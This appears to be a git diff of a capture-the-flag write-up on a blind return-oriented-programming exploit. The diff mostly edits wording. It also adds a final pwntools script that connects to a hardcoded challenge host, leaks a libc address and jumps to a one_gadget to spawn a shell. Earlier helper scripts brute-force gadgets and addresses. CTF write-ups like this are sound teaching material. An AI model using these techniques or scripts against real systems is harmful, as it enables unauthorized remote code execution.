@@ -154,7 +154,7 @@ def GetStackCanary():
             # Don't send Enter here, it will read to buffer
             p.send(payload + p8(i))
             
-            # Enter to send payload to server, doesn't read to buffer
+            # Enter to send payload to server, doesn't read to buffer but will sent to next input so be aware
             p.send(b'\n')
 
             try:
@@ -181,9 +181,9 @@ And we leak the stack canary:
 
 ![found_stack_canary.png](images/found_stack_canary.png)
 
-Oh wait, that's not stack canary! Stack canary won't have so much null bytes like that and it will full of 8 bytes. So that is return rip and we can use that to bruteforce things. Also with that address, we now know that program base address will start from `0x400000`. 
+Oh wait, that's not stack canary! Stack canary won't have so much null bytes like that and it will full of 8 bytes. It is the return rip and we can use this to bruteforce things. Also with that address, we now know that program base address will start from `0x400000`. 
 
-From here, we can find stop gadget with start address at 0x400000 and stop address at 0x401000 (enough for a ELF file). In face, these stop gadget are many, so that we just need to find one of them. I will use multiple thread for better performance:
+From here, we can find stop gadget with start address at 0x400000 and stop address at 0x401000 (enough for a ELF file). In face, these stop gadget are many, so we just need to find one of them. I will use multiple thread for better performance:
 
 <details>
 <summary>Sub Script</summary>
@@ -206,7 +206,7 @@ def GetStopGadget(start_addr, stop_addr):
         p.recvline()
         # Don't send Enter here, it will read to buffer
         p.send(payload)
-        # Enter to send payload to server, doesn't read to buffer
+        # Enter to send payload to server, doesn't read to buffer but will sent to next input so be aware
         p.send(b'\n')
         try:
             # Check if it can receive or not
@@ -261,7 +261,7 @@ def GetMain(start_addr, stop_addr):
         p.recvline()
         # Don't send Enter here, it will read to buffer
         p.send(payload)
-        # Enter to send payload to server, doesn't read to buffer
+        # Enter to send payload to server, doesn't read to buffer but will sent to next input so be aware
         p.send(b'\n')
         try:
             if b'blind my friend' in p.readline():
@@ -303,9 +303,9 @@ The main address is at `0x4005c0`. That's wonderful! Let's move on guys.
 
 ### 3. Finding useful_gadget ([Table of Content](#3-exploit))
 
-Finding useful gadget means finding 6 pop in csu (pop rbx; rbp; r12; r13; r14; r15; ret in csu). This is the essential part of program so it usually has in the program after main. We now have main address , so finding useful gadget, we will start from `0x405000`. 
+Finding useful gadget means finding 6 pop in csu (pop rbx; rbp; r12; r13; r14; r15; ret in csu). Csu is the essential part of program so it's usually in the program after main. We now have main address, to find useful gadget we will start from `0x405000`. 
 
-One more thing to know, the 6 pop doesn't have `pop rdi ; ret`, which is important for us, so how can we get that from 6 pop? We will take an example of another file, using `objdump`, we get that 6-pop here:
+One more thing to know, the 6 pop doesn't have `pop rdi ; ret` which is important for us, so how can we get that from 6 pop? We will take an example of another file, using `objdump`, we get that 6-pop here:
 
 ```
   4007ea:    5b                       pop    rbx
@@ -317,7 +317,7 @@ One more thing to know, the 6 pop doesn't have `pop rdi ; ret`, which is importa
   4007f4:    c3                       ret
 ```
 
-And we use this website to compile assembly code online:
+And we use [this website](https://defuse.ca/online-x86-assembler.htm) to compile assembly code online:
 
 ![rop_rdi.png](images/rop_rdi.png)
 
@@ -325,7 +325,7 @@ We can see that at the last pop (`pop r15`), the opcode is similar to `pop rdi`:
 
 ![pop_rdi_csu.png](images/pop_rdi_csu.png)
 
-So that if our useful_gadget is `0x4007ea`, we will have `pop rdi` at address `0x4007ea + 9`. So just create script to check if it's 6-pop then check if it's 1-pop next and we can filter out so much (multiple thread again). Usually, csu is at the end of program so we just need to take the bigger address and that will be pop 6 in csu:
+So if our useful_gadget is `0x4007ea`, we will have `pop rdi` at address `0x4007ea + 9`. Now just create script to check if it's 6-pop then check if it's 1-pop next and we can filter out so much (multiple thread again). Usually, csu is at the end of program so we just need to take the bigger address and that will be pop 6 in csu:
 
 <details>
 <summary>Sub Script</summary>
@@ -353,7 +353,7 @@ def GetUsefulGadget(start_addr, stop_addr):
         # Don't send Enter here, it will read to buffer
         p.send(payload1)
 
-        # Enter to send payload to server, doesn't read to buffer
+        # Enter to send payload to server, doesn't read to buffer  but will sent to next input so be aware
         p.send(b'\n')
         try:
             # If pop 6 succeeded and jump back to main
@@ -442,7 +442,7 @@ def GetPutsPLT(start_addr, stop_addr):
         # Don't send Enter here, it will read to buffer
         p.send(payload)
 
-        # Enter to send payload to server, doesn't read to buffer
+        # Enter to send payload to server, doesn't read to buffer but will sent to next input so be aware
         p.send(b'\n')
         try:
             if b'\x7fELF' in p.readline():
@@ -479,11 +479,11 @@ Running the script and we will get puts@plt address at `0x400550`:
 
 ![puts_addr.png](images/puts_addr.png)
 
-That's is almost everything we need. Just 1 more things we can do is dump the program opcode from stack, then view assembly code to get to know how the program work and we can plan the exploitation easier. Let's move on next step!
+That's is almost everything we need. Just 1 more things we can do is to dump the program opcode from stack, then view assembly code to get to know how the program work and we can plan the exploitation easier. Let's move on next step!
 
 ### 5. Dumping stack ([Table of Content](#3-exploit))
 
-We have puts@plt, we know the base, everything now is just simple as it is. Remember that if we recv just 1 byte `\n`, that is null byte, not `\n`, but if we recv more than 2 byte, just make sure to remove `\n` at the end or it may cause some troubles:
+We have puts@plt and we know the base, everything now is just simple as it is. Remember that if we recv just 1 byte `\n`, that is null byte, not `\n`, but if we recv more than 2 byte, just make sure to remove `\n` at the end or it may cause some troubles:
 
 <details>
 <summary>Sub Script</summary>
@@ -511,7 +511,7 @@ def DUMPCORE(thread, start_addr, stop_addr):
         # Don't send Enter here, it will read to buffer
         p.send(payload)
 
-        # Enter to send payload to server, doesn't read to buffer
+        # Enter to send payload to server, doesn't read to buffer but will sent to next input so be aware
         p.send(b'\n')
         try:
             data = p.recv()
@@ -571,7 +571,7 @@ Now let's keep going. Let's examine from the string `Are you blind my friend?`. 
 
 We can see that this function just sub 0x80 but input upto 0x400 so **Buffer Overflow** is what we are exploiting. The function `sub_400580` is `read@plt` because all parameters are just in the correct position. The function `sub_4005A0` may be `strcmp@plt` because rdi is our input string but rsi is the string `aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd`. 
 
-After that comparision, it returns without changing any register (all @plt will return back all register after it's done). So we know that rdi still remains, pointing to our input. We know that puts just end when it meet newline character `\n`, not null byte.
+After that comparision, it returns without changing any register (all @plt change register but then return back all register after it's done). So we know that rdi still remains, pointing to our input. We know that puts just end when it meet newline character `\n`, not null byte.
 
 So with our payload is on stack and rdi, we can try to puts our string to check if we can get anything interesting and the end of our input (check address after overwrited rip) with payload like this:
 
@@ -583,11 +583,76 @@ payload = b'A'*88 + p64(puts_plt)
 
 Oh what's that? Where is our string? We know that rdi remains our input string but why we can see just `AAAAAAAA` after 8-byte first? Maybe when our string goes into `strcmp@plt`, it push some value to stack and leave it there. 
 
-As you can see that somethings interesting are in our input like some address in libc (`b'\x9aS/\xab\x1c\x7f\x00\x00', b' \x16d\xab\x1c\x7f\x00\x00'`) and some address of stack (`b'\xf0\xfd\xae\xa5\xfe\x7f\x00\x00', b'0\xff\xae\xa5\xfe\x7f\x00\x00'`). Why we know that, because libc address format usually is `0x7fxxxxxxxxxx` while stack format usually is `0x7ffxxxxxxxxx`.
+As you can see that somethings interesting are in our input like some address in libc (`b'\x9aS/\xab\x1c\x7f\x00\x00', b' \x16d\xab\x1c\x7f\x00\x00'`) and some address of stack (`b'\xf0\xfd\xae\xa5\xfe\x7f\x00\x00', b'0\xff\xae\xa5\xfe\x7f\x00\x00'`). Why we know that? Because libc address format usually is `0x7fxxxxxxxkkk` and those `kkk` at the end doesn't change after every run, while stack format usually is `0x7ffxxxxxxxxx`.
 
-At first, I 
+> At first, I intended to dump stack with leaked stack address to get the address of stack where it store those `AAAAAAAA` character. From that we just replace `AAAAAAAA` to `/bin/sh\x00`, which fit 8 bytes, and overwrite the rip with system via leak libc address. But when I changed form `AAAAAAAA` to `/bin/sh\x00`, the leak went wrong so we cannot exploit this way. We will exploit as following.
 
+Look at the libc leak, the first one end with `b'\x9a'` which doesn't seem to be any function so we will use the second one which end with `b'\x20\x16'`. Now we have leaked address and provided libc, we just bruteforce with different offset we can find in provided libc to calculate libc base, then we will use one gadget to get our shell.
 
+One gadget:
+
+![one_gadget.png](images/one_gadget.png)
+
+To make sure the rsp is null may be quite hard or unsure so we will use the first one, `rax == NULL`. And with provided libc, it's easy to make rax become null with this gagdet:
+
+![xor_rax.png](images/xor_rax.png)
+
+And we will need all libc function which end with `620`. Why just `620` but not `1620` as above leaked libc address? As I said that just 3 least `620` is remain, the `1` in `1620` will change after each run so we just find from provided libc which function end with `620`:
+
+```
+$ objdump -T libc-2.23.so | grep "620 "
+0000000000129620 g    DF .text    0000000000000115  GLIBC_2.2.5 __nss_configure_lookup
+00000000003c5620 g    DO .data    00000000000000e0  GLIBC_2.2.5 _IO_2_1_stdout_
+000000000008b620 g    DF .text    000000000000017f  GLIBC_2.2.5 __strerror_r
+000000000008b620  w   DF .text    000000000000017f  GLIBC_2.2.5 strerror_r
+0000000000071620 g    DF .text    00000000000000a3  GLIBC_2.2.5 wscanf
+```
+
+Now we just use the leaked libc address subtract with these offset to get libc base, then calculate one gadget and put it to the rip and we get the shell. Script will be as follows:
+
+<details>
+<summary></summary>
+<p>
+
+```
+from pwn import *
+
+context.log_level = 'debug'
+
+libc = ELF('./libc-2.23.so', checksec=False)
+libc.sym['one_gadget'] = 0x45226
+libc.sym['xor_rax_rax_ret'] = 0x8b945
+
+buff_size = 88
+stop_gadget = 0x400705
+main = 0x4005c0
+useful_gadget = 0x4007ba
+puts_plt = 0x400560
+
+offset_list = [0x129620, 0x3c5620, 0x08b620, 0x071620]
+
+for offset in offset_list: 
+    p = connect('34.159.129.6', 30550)
+    payload1 = b'A'*88 + p64(puts_plt) + p64(main)
+    p.recvline()
+    # Don't sendline here or payload won't work
+    p.send(payload1)
+
+    data = p.recv()
+    leak_addr = u64(data[24:24+8])
+    libc.address = leak_addr - offset
+
+    payload2 = b'A'*88
+    payload2 += p64(libc.sym['xor_rax_rax_ret'])
+    payload2 += p64(libc.sym['one_gadget'])
+
+    p.send(payload2)
+    p.interactive()
+    p.close()
+```
+
+</p>
+</details>
 
 # 4. Get Flag
 
